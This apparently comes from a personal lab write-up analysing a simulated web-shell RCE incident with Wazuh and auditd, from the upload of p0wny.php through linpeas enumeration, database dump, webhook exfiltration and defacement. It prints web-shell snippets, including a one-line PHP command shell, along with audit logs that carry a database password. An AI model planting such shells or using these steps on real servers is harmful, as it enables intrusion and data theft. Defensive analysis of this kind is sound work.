Incident Analysis - Remote Code Execution (RCE)

Date: Sep 19, 2026
Tags: SOC DFIR Endpoint Security Web Application Security Threat Hunting Log Correlation MITRE ATTACK SIEM Wazuh Linux Auditd Apache

I. Executive Summary

In previous lab entries, I utilized Wazuh to aggregate network, endpoint, and application telemetry. I tested the Linux detection mechanisms implemented by performing a simulated, multi-stage Remote Code Execution (RCE) incident on a public-facing web server that led to the leakage of sensitive company data.

I correlated the events in Wazuh to track the adversary's post-exploitation activities. The alerts guided me in identifying the pattern and nature of the attack, while alert filtering allowed me to investigate more closely and map the full attack chain. Starting from a single crafted HTTP POST request to the deletion of the entire database.

II Attack Chain Overview (MITRE ATT&CK)
Tactics Technique Implementation Summary
Initial Access Exploit Public-Facing Application (T1190) Exploited a web application bug to gain access to the web server.
Stealth File Deletion (T1070.004) Removed the database dump, enumeration script, and its result.
Persistence Web Shell (T1505.003) Attacker did not remove the p0wny.php during artifact cleanup, keeping it available for later access.
Credential Access Credentials In Files (T1552.001) Accessed the contents of an .env file stored in /var/www/html/.
Discovery File and Directory Discovery(T1083) Scanned for credentials, configs, and other sensitive files across the system using find.
Collection Automated Collection (T1119) Automated collection of sensitive informations was performed by running linpeas.sh script.
Command and Control Web Protocols (T1071.001) Interacted with the uploaded .php shell web requests as the command channel.
Exfiltration Exfiltration Over Webhook (T1567.004) Exfiltrated the data using webhook via curl.
Impact Data Destruction (T1485) Deleted the entire database using DROP DATABASE.
External Defacement (T1491.002) Modified index.php to redirect web browsers to an extortion web page.
III. Incident Analysis and Alert Correlation
3.1 Triage

The SIEM generated over 10,000 alerts from the lab-lin-ubuntu_s1 within few minutes. After analyzing the fields, I noticed the alerts pointed to the web server user (uid: 33) and the last was execve syscall: 59 more importantly, it used the exe:/usr/bin/dash which indicates there is an ongoing remote code execution. After filtering the commands, I found out that the threat actor used find, grep, ls, gawk, cut, along with other commands used for scanning system files. The observed RCE activity would warrant host isolation and escalation for deeper investigation.

3.2 Attack Timeline

  1. Phase 1 - Web Server Initial Access

    • Exploited the vulnerability on a publicly visible IT Requisition form of the organization.
    • Uploaded a web shell p0wny.php via a crafted HTTP POST request.

  2. Phase 2 - Enumeration and Report Exfiltration

    • Performed automated credential enumeration using linpeas.sh and stored the results on a txt file.
    • Exfiltrated the results to analyze collected credentials

  3. Phase 3 - Database Access and Exfiltration

    • Used the credentials collected by linpeas.sh to access and create a data dump of CorpNet's corp_vault MySQL database.
    • Exfiltrated the data dump via HTTP POST to the threat actor's webhook.

  4. Phase 4 - Impact

    • Deleted CorpNet's database and the data dump with DROP DATABASE and rm.
    • Wrote an extortion page note.html demanding payment from CorpNet.
Phase 1 - Web Server Initial Access

Just moments before a flood of enumeration alerts were triggered on the SIEM, The IP 192.168.11.254 sent a crafted HTTP POST request as indicated by the user agent curl. The rest of the requests from that IP shows HTTP POST for p0wny.php with the parameter feature=shell.

192.168.11.254 - - [20/Sep/2026:11:47:45 +0800] "GET /uploads/p0wny.php HTTP/1.1" 200 3849 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36 Edg/153.0.0.0"
192.168.11.254 - - [20/Sep/2026:11:48:22 +0800] "POST /uploads/p0wny.php?feature=shell HTTP/1.1" 200 299 "http://192.168.11.200/uploads/p0wny.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36 Edg/153.0.0.0"

A screenshot on the server, it shows that p0wny.php was created by www-data around the time a POST request was made on the server.

After looking inside p0wny.php for the feature parameter on the web requests, I traced it back to featureShell() function that runs the command on the host using shell_exec. This confirms that the attacker achieved remote command execution through a web shell.

if (isset($_GET["feature"])) {
   $response = featureShell($cmd, $_POST["cwd"]);
}

function featureShell($cmd, $cwd) {
    $cmd = "/bin/bash -c \"$cmd\"";
    $files = explode("\n", shell_exec($cmd));
}

VirusTotal also flagged p0wny.php as trojan.webshell

This actually did not trigger any alert because the Linux commands were placed inside the body using $_POST which is not visibly captured by access.log. While a simpler version such as <?php system($_GET['cmd']); ?> would trigger SIEM alerts.

Phase 2 - Enumeration and Report Exfiltration

Because there were massive amount of execve alerts, I filtered them on Wazuh, and discovered that frequently used commands were grep, sed, find and ls which is common for enumeration while cut, tr and awk for extracting values and writing to a file. Because that gave me some idea on whats the contents of thousands of alerts, I filtered them out and the 12,000 was reduced to 1,300 alerts to analyze.

Because the amount of logs was significantly reduced, I was able to easily see other possible clues before and after the flood of alerts. It shows that uid:33 executed chmod after a curl command.

Phase 3 - Database Access and Exfiltration

Then, there were alerts for www-data syscall for /usr/bin/mysql. It used the user req_app_user but the executed statements after the -e flag were missing. After decoding the proctitle on full_log it turned out a5 was "SHOW TABLES;" (decoded from Hex).

type=EXECVE  a0="mysql" a1="-u" a2="req_app_user" a3="-pP@ssw0rd_DB_Admin_99!" > a4="-e" a5=53484F57205441424C45533B a6="corp_vault"

Then mysqldump was used to dump all the data stored on corp_vault database. The output file was not captured by auditd.

type=EXECVE a0="mysqldump" a1="-u" a2="req_app_user" a3="-pP@ssw0rd_DB_Admin_99!" a4="corp_vault"

But proctitle revealed that it was written on corp_vault_dump.sql.

sh-c--mysqldump -u req_app_user -p'P@ssw0rd_DB_Admin_99!' corp_vault > /tmp/corp_vault_dump.sql 2>&1

Lastly, auditd captured a curl command that sends corp_vault_dump.sql to the same webhook used for exfiltrating the linpeas scan results.

Investigation Note

I looked into to why some auditd alert had missing execve values (execve.a0, execve.a1, ... execve.aX) on the dashboard. Because its a missing field, I thought it must be on the decoder. After finding the auditd decoder, I discovered that it uses aX="(\S+)" to capture command parameters, which misses the parameters that auditd converts to hexadecimal because of spaces, double quotes, and other special characters.

</decoder>

IV. Findings
  • The adversary uploaded a malicious .php shell file through an unvalidated upload form which enabled remote command execution as server's www-data user.
  • Attacker performed an enumeration scan on the web server using linpeas to look for misconfigurations, credentials, and other sensitive files including the .env file containing database credentials.
  • Exfiltrated the linpeas.sh scan result recon_report.txt the created database dump corp_vault_dump.sql to the attacker via webhook.
  • Database corp_vault and attack artifacts were deleted, compromising the confidentiality and availability of the data. Then created a database dump using mysqldump.
  • Defaced the homepage by redirecting it to a page note.html that demands payment for the data.

V. Lessons Learned

  • Commands that use redirection such as > to control output were not captured by auditd decoders which made it harder to query for them. Still, the entire command is available on the full_log's proctitle but is encoded in hexadecimal.
  • Auditd convert unsafe strings (with space, quotation marks, and other special characters/bytes) into hexadecimal to prevent log injection attacks toward log parsers. This breaks the decoders that expects key="Value" but not key=HEX.
  • Because this web shell use /bin/bash -c $cmd to execute commands on the server, a new bash process is created for every command. As a result, relying on PPID/PID correlations is impractical.
  • Apache access logs provided useful metadata about the requests, but the configured logging did not capture the HTTP request body. As a result, commands supplied through POST parameters were not directly visible in the access logs.
  • Passwords and other sensitive information should not be passed as command line arguments. These information are included on process telemetry and auditd logs and will pose a threat to the confidentiality of the data.
  • This reinforced the the importance of separating web-facing services from sensitive data and internal networks. (While lab uses a flat network due to hardware limitations).
